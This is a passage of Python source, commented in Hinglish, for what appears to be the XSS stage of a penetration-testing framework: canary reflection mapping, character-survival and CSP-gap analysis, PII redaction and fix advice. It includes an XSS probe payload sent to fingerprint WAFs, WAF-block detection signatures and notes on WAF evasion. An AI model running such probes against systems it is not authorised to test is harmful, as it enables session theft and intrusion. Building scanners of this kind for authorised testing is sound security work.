             "likho; Burp Repeater me wahi variant manual PoC ka base banta "
             "hai; WAF vendor ko bypass-sample bhejo (engagement me allowed "
             "ho to).",
     "impact": "HIGH - WAF evasion + live sink"},
    {"when": "xss_stored_candidate|xss_stored_confirmed",
     "then": "1) APNE test account ke field me inert marker; 2) dusre session "
             "(victim-sim) me render dekho; 3) self-XSS ko stored me chain "
             "mat karo bina RoE; 4) fix: server-side sanitize (allowlist) + "
             "CSP.",
     "impact": "CRITICAL - persistent session theft (multi-user)"},
    {"when": "xss_dom_suspected|xss_postmessage_no_origin",
     "then": "1) fragment param value browser me daal kar sink trigger dekho "
             "(#fragment = server logs me bhi nahi aata); 2) postMessage case "
             "me origin-check patch suggest karo; 3) DOMPurify-type sanitizer "
             "sink par suggest karo.",
     "impact": "MEDIUM -> HIGH (client-side, log-free)"},
    {"when": "xss_csp_missing|xss_csp_unsafe_inline|xss_csp_weak",
     "then": "CSP report ko finding ke saath attach karo - same endpoint ke "
             "XSS findings ki exploitability isse decide hoti hai; fix-sugg:"
             " nonce-based script-src + require-trusted-types-for 'script'.",
     "impact": "DEFENSE-GAP - exploitability multiplier"},
    {"when": "xss_url_scheme_injection|xss_header_link_injection",
     "then": "link-injection ko click-path map karo (kahan user click karta "
             "hai); XFH reflection cache-layer me poison ban sakta hai (P26) "
             "- wahan same params re-test karo.",
     "impact": "MEDIUM - chains (cache/phishing)"},
    {"when": "xss_json_script_embed",
     "then": "1) JSON endpoints me </ escape audit (P17 API handoff); "
             "2) Content-Type nosniff + charset fix suggest karo; 3) "
             "script-embedding ko JSON.parse-only pattern me migrate karo.",
     "impact": "MEDIUM - API-embedded gadget"},
]


# ===========================================================================
# FINDINGS + REDACTION (P12 pattern, unit-testable, koi network nahi)
# ===========================================================================
_PII_EMAIL = re.compile(r"(?i)\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z]{2,}\b")
_PII_JWT = re.compile(r"\beyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{0,}")
_PII_PHONE = re.compile(r"(?<![\d])\+?\d[\d \-]{8,14}\d(?![\d])")


def pii_redact(s, limit=420):
    """Evidence/detail text se PII mask karo (framework rule: redacted evidence)."""
    s = _PII_JWT.sub("eyJ***REDACTED***", s or "")
    s = _PII_EMAIL.sub(lambda m: m.group(0)[:2] + "***@***", s)
    s = _PII_PHONE.sub("***PHONE***", s)
    return truncate(s, limit)


class Findings:
    def __init__(self):
        self.items = []

    def add(self, key, title, endpoint, detail, evidence_ref="", extra=None):
        sev, cvss, why = classify_severity(key)
        rec = {"id": "XSS-%03d" % (len(self.items) + 1), "key": key, "title": title,
               "severity": sev, "cvss_hint": cvss, "endpoint": endpoint,
               "detail": pii_redact(detail), "why_it_matters": why,
               "evidence": evidence_ref, "ts": now_iso()}
        if extra:
            rec.update(extra)
        self.items.append(rec)
        return rec


def _sev_counts(F):
    counts = {}
    for f in F.items:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    return counts


# ---------------------------------------------------------------------------
# WAF BLOCK SIGNATURES (P12-compatible, XSS-focused additions)
# ---------------------------------------------------------------------------
WAF_BLOCK_SIGS = [
    (r"attention required.*cloudflare", "cloudflare"),
    (r"cloudflare.*ray id.*error 10\d\d", "cloudflare"),
    (r"access denied", "waf-generic"),
    (r"request blocked", "waf-generic"),
    (r"blocked by.*security", "waf-generic"),
    (r"mod_security", "modsecurity"),
    (r"ModSecurity", "modsecurity"),
    (r"web application firewall", "waf-generic"),
    (r"AWS WAF", "aws-waf"),
    (r"Request Blocked: [A-Za-z0-9.]+", "aws-waf"),
    (r"you don't have permission to access", "apache-deny"),
    (r"bot verification", "bot-check"),
    (r"captcha", "bot-check"),
    (r"406 not acceptable", "406-block"),
    (r"security reason", "waf-generic"),
    (r"cross.?site scripting", "xss-filter"),
    (r"xss detected", "xss-filter"),
    (r"script.?tag.*not.*allowed", "xss-filter"),
    (r"event.?handler.*not.*allowed", "xss-filter"),
    (r"malicious (?:code|payload|content)", "xss-filter"),
    (r"wzws", "wzws"),
    (r"yundun", "aliyun-waf"),
    (r"safedog", "safedog"),
    (r"akamai.*reference", "akamai"),
]

WAF_STATUS_BLOCK = {403, 406, 418, 429, 451}

_WAF_SIGS = [(re.compile(rx, re.I), tag) for rx, tag in WAF_BLOCK_SIGS]


def match_waf_block(r, base=None):
    """Resp -> (waf_tag|None, snippet). Status + body-signature combined."""
    if r is None or r.error:
        return None, ""
    st = r.status or 0
    text = r.text[:3000]
    for rx, tag in _WAF_SIGS:
        m = rx.search(text)
        if m:
            return tag, truncate(m.group(0), 140)
    if st in WAF_STATUS_BLOCK and base:
        if len(r.body) and abs(len(r.body) - base.get("len", 0)) > 64:
            return "status-block", "%d len=%d" % (st, len(r.body))
        if st == 406:
            return "status-block", "406"
    if st == 406:
        return "status-block", "406"
    return None, ""

# ===========================================================================
# PURE HELPERS (unit-testable, koi network nahi)
# ===========================================================================
def _split_url(url):
    sp = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
    return sp, qs


def set_param(url, name, value):
    """URL me ?name= replace (agar hai) warna append. Query order preserve."""
    sp, qs = _split_url(url)
    new_q = []
    replaced = False
    for k, v in qs:
        if k == name and not replaced:
            new_q.append((k, value))
            replaced = True
        else:
            new_q.append((k, v))
    if not replaced:
        new_q.append((name, value))
    enc = urllib.parse.urlencode(new_q)
    return urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path, enc, sp.fragment))


def get_param_value(url, name):
    sp, qs = _split_url(url)
    for k, v in qs:
        if k == name:
            return v
    return ""


def _is_noise_path(url):
    path = urllib.parse.urlsplit(url).path.lower()
    return bool(re.search(r"\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|mp4|webp)(\?|$)", path)) \
        or bool(re.search(r"(?i)(^|/)(static|assets|cdn|fonts|images|img)(/|$)", path))


def body_sim(a, b):
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:6000], b[:6000]).ratio()


def differs(r, base, sim_threshold=0.985):
    """Resp baseline se truly different hai? (status ya len ya body-sim)."""
    if r is None or r.error:
        return False
    if r.status != base.get("status"):
        return True
    ln = len(r.body)
    tol = max(24, int(0.02 * max(1, base.get("len", 0))))
    if abs(ln - base.get("len", 0)) > tol:
        return True
    if body_sim(r.text, base.get("text_sample", "")) < sim_threshold:
        return True
    return False


def template_key_of(url):
    sp, _ = _split_url(url)
    return "%s %s" % ("GET", sp.path)


def mark_confirmed(ctx, url, param, klass):
    """One-confirm-per-param rule: confirmed (url,param) dobara probe nahi hota."""
    key = (template_key_of(url), param, klass)
    ctx.setdefault("confirmed", set()).add(key)


def is_confirmed(ctx, url, param, klass):
    return (template_key_of(url), param, klass) in ctx.get("confirmed", ())


def capture(ctx, url, param, payload, r, note=""):
    """FIX-1: shared capture store - DOM analysis + context map isi se banta hai."""
    if r is None or r.error:
        return
    ctx.setdefault("captures", [])
    if len(ctx["captures"]) >= 900:
        return
    ctx["captures"].append({
        "url": url, "param": param, "payload": payload, "status": r.status,
        "len": len(r.body), "text": r.text[:3000],
        "loc": r.header("Location", ""), "note": note,
    })


# ---------------------------------------------------------------------------
# CONTEXT CLASSIFIER (stage C core, pure) - P12 ke 5-rule se 16-rule
# ---------------------------------------------------------------------------
_SCRIPT_INNER_RX = re.compile(r"(?is)<script\b[^>]*>(.*?)</script>")


def reflection_context_xss(text, marker):
    """text me marker kahan reflect hua -> (context, verbatim:bool).
    Returns ("", False) jab reflection hi na mile.
    Script-block contexts (js-raw/js-string/js-tmpl) anchored handle hote hain
    pehle - warna loose quote-rules attribute values ko shadow kar dete hain."""
    if not marker or not text:
        return "", False
    esc = re.escape(marker)
    # 1) script-block anchored contexts
    for m in _SCRIPT_INNER_RX.finditer(text):
        inner = m.group(1)
        i = inner.find(marker)
        if i >= 0:
            pre = inner[max(0, i - 2): i]
            if "`" in pre:
                return "js-tmpl", True
            if pre.endswith("'") or pre.endswith('"'):
                return "js-string", True
            return "js-raw", True
    # 2) non-script contexts (CTX_RULES order = tight -> loose)
    for name, rx in CTX_RULES:
        try:
            probe_rx = re.compile(rx.pattern.replace("%s", esc))
        except re.error:
            continue
        if probe_rx.search(text):
            return name, True
    # 3) verbatim reflection anywhere?
    if re.search(esc, text):
        return "raw-reflect", True
    # 4) entity/percent-encoded forms?
    ent = html.escape(marker)
    if ent in text or ent[: max(4, len(ent) // 2)] in text:
        return "html-encoded", False
    pct = urllib.parse.quote(marker)
    if pct in text:
        return "url-encoded", False
    return "", False


def which_reflection(text, marker):
    """(context, verbatim, snippet) - reflection_context_xss ka wrapper."""
    ctxn, verbatim = reflection_context_xss(text, marker)
    if not ctxn:
        return "", False, ""
    idx = text.find(marker)
    if idx < 0:
        idx = text.find(html.escape(marker))
    lo = max(0, idx - 90)
    snip = text[lo: idx + len(marker) + 90].replace("\n", " ")
    return ctxn, verbatim, snip


# ---------------------------------------------------------------------------
# SURVIVING-CHARSET ANALYSIS (stage J core, pure) - exploitability driver
# ---------------------------------------------------------------------------
DANGEROUS_CHARS = list("<>\"'&()=:;/-\t\n`")


def surviving_charset(raw_response_text, marker):
    """marker ke aas-paas jo chars verbatim bache unka report:
    {'verbatim': [chars], 'encoded_map': {char: encoded-form}, ...}
    Marker ke BAGAL me bheje gaye probe-chars se derive hota hai."""
    out = {"verbatim": [], "encoded": {}, "missing": []}
    for ch in DANGEROUS_CHARS:
        # marker + ch + marker pattern dhoondo (probe me hum canary-char pairs
        # bhejte hain: marker1<marker2 marker1>marker2 ...)
        if (marker + ch + marker) in raw_response_text:
            out["verbatim"].append(ch)
            continue
        ent = html.escape(ch, quote=True)
        # entity-encoded form (single char marker-wrapped)
        if (marker + ent + marker) in raw_response_text:
            out["encoded"][ch] = "html-entity"
            continue
        pct = urllib.parse.quote(ch)
        if (marker + pct + marker) in raw_response_text:
            out["encoded"][ch] = "url-encoded"
            continue
        if (marker + urllib.parse.quote(ch, safe="%") + marker) in raw_response_text:
            out["encoded"][ch] = "url-encoded-raw"
            continue
        out["missing"].append(ch)
    return out


def charset_exploitability(surv, context):
    """surviving-charset + context -> exploit-capable? (pure reasoning)
    Returns (verdict_boost, reason) - CONFIRMED ko justify karne ke liye."""
    ver = set(surv.get("verbatim", []))
    if context in ("html-body", "raw-reflect"):
        if "<" in ver and ">" in ver:
            return True, "< > verbatim bache - tag-injection possible"
        return False, "tag-chars encoded/stripped"
    if context in ("html-attr-dq", "form-value"):
        if '"' in ver or ("<" in ver and ">" in ver):
            return True, "quote/tag chars bache - attr breakout possible"
        return False, "attr-breakout chars encoded"
    if context == "html-attr-sq":
        if "'" in ver or ("<" in ver and ">" in ver):
            return True, "single-quote bacha - attr breakout possible"
        return False, "quote encoded"
    if context == "html-attr-uq":
        if " " in ver or ">" in ver or "<" in ver:
            return True, "unquoted-attr breakout chars bache"
        return False, "space/tag encoded"
    if context in ("js-string", "js-tmpl", "js-raw"):
        if "'" in ver or '"' in ver or "`" in ver:
            return True, "quote bacha - js-string breakout possible"
        if "<" in ver and "/" in ver:
            return True, "</script> close possible"
        return False, "js-breakout chars encoded"
    if context in ("html-comment",):
        if "-" in ver and ">" in ver:
            return True, "--> breakout possible"
        return False, "comment-close encoded"
    if context in ("rcdata", "noscript", "style-block"):
        if "<" in ver and "/" in ver:
            return True, "close-tag breakout possible"
        return False, "close-tag encoded"
    if context in ("url-attr", "meta-refresh"):
        joined = "".join(ver)
        if ":" in ver or "&" in ver:
            return True, "scheme/entity chars bache - scheme-injection possible"
        return False, "scheme chars encoded"
    if context == "inside-tag":
        if ">" in ver or " " in ver or "=" in ver:
            return True, "attr-injection chars bache inside tag"
        return False, "inside-tag breakout blocked"
    if context == "style-attr":
        return False, "legacy expression() - modern browsers dead (note)"
    return False, "context-specific breakout chars missing"


# ---------------------------------------------------------------------------
# CANARY MARKERS (per-param unique, cache-buster proof)
# ---------------------------------------------------------------------------
def make_canary(param, seed_txt=""):
    """waspX13_<param-slug>_<rand6> - unique per probe (cache/soft-404 guard)."""
    slug = re.sub(r"[^a-z0-9]", "", (param or "p").lower())[:12] or "p"
    return "waspX13%s%s" % (slug, rand_str(6))


def make_charprobe(param):
    """char-survival probe: marker+char+marker PAIRS (stage J input).
    surviving_charset() isi pattern ko dhoondta hai - pairs hi banane padte hain."""
    base = "waspC" + rand_str(5)
    blob = "".join(base + ch + base for ch in DANGEROUS_CHARS)
    return base, blob


# ---------------------------------------------------------------------------
# CSP PARSER (stage H core, pure)
# ---------------------------------------------------------------------------
def parse_csp(header_value):
    """CSP header -> directive dict (lower-cased directive, list values)."""
    out = {}
    for part in (header_value or "").split(";"):
        part = part.strip()
        if not part:
            continue
        bits = part.split()
        out[bits[0].lower()] = bits[1:]
    return out


def csp_gaps(csp):
    """directive dict -> list of (gap_key, detail) - defense-gap analysis.
    Source values se quotes strip hote hain ('unsafe-inline' -> unsafe-inline)."""
    gaps = []

    def _vals(lst):
        return [v.strip("'\"") for v in (lst or [])]

    if not csp:
        gaps.append(("csp-missing", "CSP header hi absent hai"))
        return gaps
    ss = _vals(csp.get("script-src")) or _vals(csp.get("default-src")) or []
    if not csp.get("script-src") and not csp.get("default-src"):
        gaps.append(("no-script-src", "script-src/default-src dono absent"))
    if "unsafe-inline" in ss:
        gaps.append(("unsafe-inline", "script-src me 'unsafe-inline' - nonce bypass"))
    if "unsafe-eval" in ss:
        gaps.append(("unsafe-eval", "eval allow - DOM gadget risks"))
    if "*" in ss:
        gaps.append(("wildcard-src", "script-src wildcard - allowlist-bypass"))
    if any(s.startswith("*.") for s in ss):
        gaps.append(("wildcard-subdomain", "subdomain-wildcard - subdomain-takeover chain"))
    if any(s.startswith("data:") for s in ss):
        gaps.append(("data-uri-script", "script-src data: - inline-script gadget"))
    if "object-src" not in csp and "default-src" not in csp:
        gaps.append(("object-src-missing", "object-src absent - flash/embed legacy gadgets"))
    if "base-uri" not in csp:
        gaps.append(("base-uri-missing", "<base> injection se relative-URL hijack"))
    if "frame-ancestors" not in csp:
        gaps.append(("frame-ancestors-missing", "framing allow - clickjacking adjacency"))
    if any(s.startswith("http:") for s in ss):
        gaps.append(("mixed-http-src", "script-src http: (no TLS) - MITM injection"))
    return gaps


SECURITY_HEADERS_XSS = [
    ("Content-Security-Policy", "csp"),
    ("X-XSS-Protection", "x-xss"),          # legacy but audit note
    ("X-Content-Type-Options", "nosniff"),
    ("Referrer-Policy", "referrer"),
    ("Cross-Origin-Opener-Policy", "coop"),
    ("Cross-Origin-Embedder-Policy", "coep"),
    ("Cross-Origin-Resource-Policy", "corp"),
]

# ===========================================================================
# STAGE A: XSS SURFACE DISCOVERY (evidence-first, P12-seeded)
# ===========================================================================
def _mine_p12_reflection_map(base_dir, eng):
    """P12 reflection_map.json - THE seed (to_phase13_xss handoff)."""
    out = []
    for d in (base_dir, eng):
        rm = load_json(os.path.join(d, "inject", "reflection_map.json"), None)
        if not isinstance(rm, dict):
            continue
        for rec in (rm.get("params") or []):
            if not isinstance(rec, dict) or not rec.get("url"):
                continue
            out.append({"url": rec["url"], "param": rec.get("param") or "",
                        "priority": 9.5 if rec.get("verbatim") else 7.0,
                        "source": "P12-reflection-map",
                        "boost": 3.2 if rec.get("verbatim") else 1.2,
                        "note": "ctx=%s" % rec.get("context", "")})
    return out


def _mine_phase_feedforward(base_dir, eng, phase_dir, want_keys, source, boost):
    """kisi bhi phase ke feedforward.json se xss-ripe keys (tolerant)."""
    out = []
    for d in (base_dir, eng):
        ff = load_json(os.path.join(d, phase_dir, "feedforward.json"), None)
        if not isinstance(ff, dict):
            continue
        mapping = ff.get("mapping") if isinstance(ff.get("mapping"), dict) else ff
        for k, v in (mapping or {}).items():
            if not isinstance(v, dict):
                continue
            if not any(w in k for w in want_keys):
                continue
            for lst_k in ("xss_ripe", "reflections", "reflected", "endpoints", "targets"):
                for rec in (v.get(lst_k) or []):
                    u = rec.get("url") if isinstance(rec, dict) else str(rec)
                    if u:
                        out.append({"url": u,
                                    "param": (rec.get("param") if isinstance(rec, dict) else "") or "",
                                    "priority": 8.5, "source": source, "boost": boost,
                                    "note": "%s.%s" % (k, lst_k)})
    return out


def _mine_p9_reflections(base_dir, eng):
    """P9 auth_redirect_xss.json -> direct reflection evidence."""
    out = []
    for d in (base_dir, eng):
        rx = load_json(os.path.join(d, "auth", "auth_redirect_xss.json"), None)
        if not isinstance(rx, dict):
            continue
        for rec in (rx.get("reflections") or rx.get("reflected") or rx.get("endpoints") or []):
            if isinstance(rec, dict) and (rec.get("url") or rec.get("param")):
                out.append({"url": rec.get("url") or "", "param": rec.get("param") or "",
                            "priority": 9.0, "source": "P9-reflection", "boost": 3.0,
                            "note": "already-reflected input"})
    return out


def _mine_phase8_queue(base_dir, eng, scope):
    """P8 priority_queue.json -> xss-class items."""
    out = []
    for q in (os.path.join(base_dir, "surface", "priority_queue.json"),
              os.path.join(eng, "surface", "priority_queue.json")):
        d = load_json(q, None)
        if not isinstance(d, dict):
            continue
        for item in (d.get("queue") or []):
            t = item.get("target") or ""
            classes = " ".join(str(c) for c in (item.get("classes") or []))
            if not t:
                continue
            out.append({"url": t, "priority": float(item.get("priority") or 10),
                        "source": "P8-queue",
                        "boost": 2.0 if re.search(r"(?i)xss|reflect|input|param|dom", classes) else 0.5})
    return out


def _mine_param_files(base_dir, eng):
    """P5/P7 param inventories -> (url,param) pairs (xss-relevant boost)."""
    out = []
    seen = set()

    def add_param_urls(txt_path, source, boost):
        if not os.path.exists(txt_path):
            return
        for line in open(txt_path, errors="ignore"):
            u = line.strip().split()[0] if line.strip() else ""
            if not u.startswith("http"):
                continue
            sp, qs = _split_url(u)
            for k, _v in qs:
                key = (u.split("?")[0], k)
                if key in seen:
                    continue
                seen.add(key)
                out.append({"url": u, "param": k, "priority": 8.0,
                            "source": source, "boost": boost})

    for d in (base_dir, eng):
        add_param_urls(os.path.join(d, "passive", "findings", "param_names.txt"), "P5-params", 1.0)
        add_param_urls(os.path.join(d, "passive", "findings", "sensitive_params.txt"), "P5-sensitive", 1.4)
        add_param_urls(os.path.join(d, "content", "all_found.txt"), "P5-content", 1.0)
        add_param_urls(os.path.join(d, "js", "endpoints.txt"), "P7-js", 1.0)
        add_param_urls(os.path.join(d, "js", "params.txt"), "P7-params", 1.2)
    return out


def _mine_forms(base_dir, eng):
    """P2 forms.json -> form input fields (GET+POST action URLs)."""
    out = []
    for d in (base_dir, eng):
        fm = load_json(os.path.join(d, "understand", "forms.json"), None)
        if not isinstance(fm, dict):
            continue
        for rec in (fm.get("forms") or fm.get("items") or []):
            if not isinstance(rec, dict):
                continue
            action = rec.get("action") or rec.get("url") or ""
            if not action.startswith("http"):
                continue
            method = (rec.get("method") or "GET").upper()
            for f in (rec.get("fields") or rec.get("inputs") or []):
                fname = f.get("name") if isinstance(f, dict) else str(f)
                if not fname:
                    continue
                u = action if method == "GET" else action
                out.append({"url": u, "param": fname, "priority": 7.0,
                            "source": "P2-forms", "boost": 1.8,
                            "note": "method=%s" % method})
    return out


def _mine_js_dom(base_dir, eng):
    """P7 dom_analysis.txt / js_analysis.json -> DOM-sink rich pages."""
    out = []
    for d in (base_dir, eng):
        ja = load_json(os.path.join(d, "js", "js_analysis.json"), None)
        if isinstance(ja, dict):
            for rec in (ja.get("dom") or ja.get("dom_sinks") or ja.get("client_redirects") or []):
                u = rec.get("url") if isinstance(rec, dict) else None
                if u:
                    out.append({"url": u, "param": (rec.get("param") if isinstance(rec, dict) else "") or "",
                                "priority": 7.5, "source": "P7-dom", "boost": 2.0,
                                "note": "dom-analysis hit"})
        dt = os.path.join(d, "js", "dom_analysis.txt")
        if os.path.exists(dt):
            for line in open(dt, errors="ignore"):
                u = line.strip().split()[0] if line.strip() else ""
                if u.startswith("http"):
                    out.append({"url": u, "param": "", "priority": 7.0,
                                "source": "P7-dom-txt", "boost": 1.8})
    return out


def _hint_targets_from_params(base_dir, scope):
    """Scope seeds + hint params: kam-e-kam kuch targets (cold start)."""
    out = []
    for seed in scope.seed_urls():
        for p in ("q", "search", "name", "message", "next", "redirect", "url", "id"):
            out.append({"url": set_param(seed, p, "1"), "param": p, "priority": 3.0,
                        "source": "hint-seed", "boost": 0.5})
    return out


def xss_param_hypothesis(name):
    """Param name -> XSS family hypotheses (pure)."""
    n = (name or "").lower()
    fam = []
    if any(h == n or n.endswith("_" + h) for h in STORED_FIELD_HINTS):
        fam.append("stored-candidate")
    if any(h == n or n.endswith("_" + h) for h in
           ("next", "redirect", "return", "return_url", "returnto", "goto", "url",
            "dest", "callback", "continue", "forward", "link")):
        fam.append("url-attr")
    if any(h == n for h in ("tpl", "template", "view", "page", "render", "preview",
                            "layout", "partial")):
        fam.append("template-render")
    if any(h == n for h in ("jsonp", "callback", "cb", "callback_fn", "cb_name")):
        fam.append("jsonp-callback")
    if n in ("q", "query", "search", "s", "keyword", "term", "name", "title",
             "message", "comment", "text", "msg", "content", "error", "lang",
             "theme", "tag", "alt", "label", "value", "data"):
        fam.append("reflected-ripe")
    if not fam:
        fam = ["reflected-ripe"]     # unknown params default hunting order
    return fam


def discover_xss_surface(base_dir, scope, conf):
    """Evidence-ranked XSS targets -> (ranked, meta) JSON-serializable."""
    eng_root = os.path.join(base_dir, scope.engagement)
    recs = []
    recs += _mine_p12_reflection_map(base_dir, eng_root)
    recs += _mine_phase_feedforward(base_dir, eng_root, "inject",
                                    ("13", "xss"), "P12-feedforward", 3.0)
    recs += _mine_phase_feedforward(base_dir, eng_root, "access",
                                    ("13", "xss"), "P11-feedforward", 2.0)
    recs += _mine_p9_reflections(base_dir, eng_root)
    recs += _mine_phase8_queue(base_dir, eng_root, scope)
    recs += _mine_param_files(base_dir, eng_root)
    recs += _mine_forms(base_dir, eng_root)
    recs += _mine_js_dom(base_dir, eng_root)

    pool = {}
    for rec in recs:
        u = rec.get("url") or ""
        if not u or not u.startswith("http"):
            continue
        u = u.split("#")[0]
        try:
            if not scope.check_url(u, raise_on_fail=False):
                continue
        except Exception:
            continue
        if _is_noise_path(u):
            continue
        param = rec.get("param") or ""
        if not param:
            sp, qs = _split_url(u)
            if not qs:
                continue
            param = qs[0][0]
        key = (u.split("?")[0], param)
        score = rec.get("boost", 1.0) + (rec.get("priority", 5.0) / 10.0)
        fams = xss_param_hypothesis(param)
        cur = pool.get(key)
        if cur is None:
            pool[key] = {"url": u, "param": param, "evidence": score,
                         "sources": [rec["source"]], "families": list(fams),
                         "note": rec.get("note", "")}
        else:
            cur["evidence"] += score * 0.35
            if rec["source"] not in cur["sources"]:
                cur["sources"].append(rec["source"])
            for f in fams:
                if f not in cur["families"]:
                    cur["families"].append(f)

    ranked = sorted(pool.values(), key=lambda r: -r["evidence"])
    if not ranked:
        for rec in _hint_targets_from_params(base_dir, scope):
            if scope.check_url(rec["url"], raise_on_fail=False):
                ranked.append(rec)

    ranked = ranked[:int(conf.get("xss_param_cap", 40))]
    for i, r in enumerate(ranked):
        r["rank"] = i + 1
    meta = {"total_mined": len(recs), "unique_targets": len(pool),
            "after_cap": len(ranked)}
    return ranked, meta


def _pick_targets(targets, pred, fallback_n):
    sel = [t for t in targets if pred(t)]
    return sel or list(targets)[:fallback_n]

# ===========================================================================
# STAGE B HELPERS: BASELINE & CALIBRATION
# ===========================================================================
def _req(http, method, url, **kw):
    """Scope-safe request wrapper: ScopeError/TypeError -> None."""
    try:
        return http.request(method, url, **kw)
    except ScopeError:
        return None
    except TypeError:
        kw.pop("read_only_post", None)
        try:
            return http.request(method, url, **kw)
        except Exception:
            return None
    except Exception:
        return None


def baseline_endpoint(http, url, conf, cp, tag="base"):
    """2x GET baseline + timing stats. Returns dict (JSON-serializable)."""
    ck = "baseline:%s:%s" % (tag, url)
    if cp.is_done(ck):
        return cp.result_of(ck) or {}
    samples = []
    for _i in range(2):
        r = _req(http, "GET", url, allow_redirects=False)
        if r is None or r.error:
            continue
        samples.append(r)
    if not samples:
        res = {"ok": False, "url": url}
        cp.mark(ck, res, summary="baseline-fail")
        return res
    lens = [len(s.body) for s in samples]
    elap = [s.elapsed for s in samples]
    tol = max(24, int(0.02 * max(1, median(lens))))
    res = {
        "ok": True, "url": url,
        "status": samples[0].status,
        "len": median(lens),
        "len_tol": tol,
        "sha1": samples[0].sha1(),
        "text_sample": samples[0].text[:4000],
        "headers": dict(list(samples[0].headers.items())[:40]),
        "elapsed_med": median(elap) if elap else 0.0,
        "elapsed_mad": (max(elap) - min(elap)) if len(elap) > 1 else 0.0,
        "stable": (len(set(lens)) == 1) or (max(lens) - min(lens) <= tol and
                    body_sim(samples[0].text, samples[1].text) >= 0.995),
        "redirect_loc": samples[0].header("Location", ""),
    }
    cp.mark(ck, res, summary="baseline")
    return res


def soft404_for_origin(http, url, conf, cp):
    """Origin-shared soft-404 baseline (cheap: 2 samples)."""
    origin = "{0.scheme}://{0.netloc}".format(urllib.parse.urlsplit(url))
    ck = "soft404:%s" % origin
    if cp.is_done(ck):
        return cp.result_of(ck) or {}
    base = soft404_baseline(http, origin, samples=2)
    cp.mark(ck, base or {}, summary="soft404")
    return base or {}


def waf_detect_xss(http, url, param, conf, cp, meta):
    """1 canary-tag probe se WAF fingerprint (per-endpoint cached).
    Block ho ya na ho - ye finding nahi, sirf calibration."""
    ck = "waf:%s:%s" % (url.split("?")[0], param)
    if cp.is_done(ck):
        return cp.result_of(ck) or {}
    if not conf.get("xss_waf_probe_budget", 0) or \
            meta.get("waf_probes_used", 0) >= int(conf.get("xss_waf_probe_budget", 6)):
        return {}
    base = baseline_endpoint(http, url, conf, cp, tag="waf")
    if not base.get("ok"):
        return {}
    meta["waf_probes_used"] = meta.get("waf_probes_used", 0) + 1
    probe_url = set_param(url, param, "<svg/onload=%s>" % MARK_JS)
    r = _req(http, "GET", probe_url, allow_redirects=False)
    tag, snip = match_waf_block(r, base)
    res = {"url": url, "param": param, "waf": tag,
           "snippet": snip, "probe_status": (r.status if r and not r.error else None)}
    cp.mark(ck, res, summary="waf-map")
    return res


def csp_snapshot(r):
    """Resp -> security-header snapshot (0 extra requests)."""
    snap = {}
    for h, k in SECURITY_HEADERS_XSS:
        v = r.header(h, "") if r is not None and not r.error else ""
        if v:
            snap[k] = v
    return snap


# ===========================================================================
# STAGE C: REFLECTION & CONTEXT MAP (canary probe -> 16-context classifier)
# ===========================================================================
def reflect_map_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage C: per-param canary + char-probe -> context + surviving-charset."""
    ck = "stageC:reflect-map"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        ok("Stage C replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    budget = int(conf.get("xss_reflect_probes", 20))
    spent = 0
    records = []
    s404 = meta.get("soft404") or {}
    for t in targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="c")
        if not base.get("ok"):
            continue
        canary = make_canary(param)
        probe_url = set_param(url, param, canary)
        r = _req(http, "GET", probe_url, allow_redirects=False)
        spent += 1
        if r is None or r.error:
            continue
        capture(ctx, url, param, canary, r, note="xss-canary")
        ctxn, verbatim, snip = which_reflection(r.text, canary)
        rec = {"url": url, "param": param, "verdict": "SAFE", "context": ctxn,
               "verbatim": verbatim, "snippet": snip, "signals": []}
        waf_tag, _ = match_waf_block(r, base)
        if waf_tag and not ctxn:
            rec["verdict"] = "WAF_BLOCKED"
            rec["signals"].append({"waf": waf_tag})
            records.append(rec)
            continue
        if not ctxn:
            # blind (no reflection) - char-probe bhi try karo (stage J data)
            if is_soft404(r, s404) and base.get("stable") is False:
                rec["verdict"] = "NOISE"
                records.append(rec)
                continue
            records.append(rec)
            continue
        # reflection mila -> char-survival probe (stage J ka input, same budget)
        cbase, charprobe = make_charprobe(param)
        if spent < budget:
            r2 = _req(http, "GET", set_param(url, param, charprobe), allow_redirects=False)
            spent += 1
            if r2 is not None and not r2.error:
                capture(ctx, url, param, charprobe, r2, note="xss-charprobe")
                rec["surviving"] = surviving_charset(r2.text, cbase)
            else:
                rec["surviving"] = None
        else:
            rec["surviving"] = None
        exp_capable, exp_reason = charset_exploitability(rec.get("surviving") or {}, ctxn)
        rec["exploit_capable"] = exp_capable
        rec["exploit_reason"] = exp_reason
        rec["csp"] = csp_snapshot(r)
        surv_chars = ((rec.get("surviving") or {}).get("verbatim") or [])
        if verbatim and exp_capable:
            rec["verdict"] = "CONFIRMED"
        elif verbatim and rec.get("surviving") is not None and not exp_capable:
            # charprobe data available; context ke breakout chars nahi bache
            # (properly-encoded per-context) - SAFE + reason report me
            rec["verdict"] = "SAFE"
        elif verbatim:
            # charprobe skip hua (budget) - manual verify
            rec["verdict"] = "SUSPECTED"
        else:
            rec["verdict"] = "SAFE" if not surv_chars else "SUSPECTED"
        mark_confirmed(ctx, url, param, "reflect-map")
        records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="reflect-map %d probes" % spent)
    ok("Stage C done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def reflect_map_findings(F, results):
    """FIX-4: stage C findings (cached replay par bhi) - ripe reflections."""
    for rec in results.get("records", []):
        if not rec.get("verbatim"):
            continue
        ep = "%s [%s]" % (rec["url"], rec["param"])
        F.add("xss_reflect_ripe",
              "Canary verbatim reflect: %s [%s]" % (rec["param"], rec.get("context")),
              ep, "marker waspX13* context=%s exploit_capable=%s reason=%s"
                  % (rec.get("context"), rec.get("exploit_capable"),
                     rec.get("exploit_reason", "")),
              evidence_ref="reflection_contexts.json",
              extra={"context": rec.get("context")})

# ===========================================================================
